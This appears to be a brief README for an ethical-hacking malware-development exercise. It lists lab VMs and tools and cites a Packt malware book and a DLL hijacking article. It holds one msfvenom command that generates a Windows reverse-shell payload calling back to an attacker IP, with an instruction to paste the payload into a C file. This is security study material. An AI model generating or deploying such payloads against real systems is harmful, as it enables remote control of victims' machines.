# Tools
- [Process Hacker](https://processhacker.sourceforge.io/)
- Kali VM 
- Windows 11 VM
- Parrot 

# Common Commands
1.
# Before getting started
You might need to generate the payload in `Kali`.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP_ADDR> LPORT=4444 -f c
```
![payload](./Screenshots/01.png)

Copy and paste the payload in `hack1.c`.


# References
- Most of codes are from [Malware-Development-for-Ethical-Hackers
](https://github.com/PacktPublishing/Malware-Development-for-Ethical-Hackers) by Zhassulan Zhussupov, 2024.
- [DLL Hijacking Basics](https://medium.com/@zapbroob9/dll-hijacking-basics-ea60b0f2a1d8) by Enes Adışen, 2023.

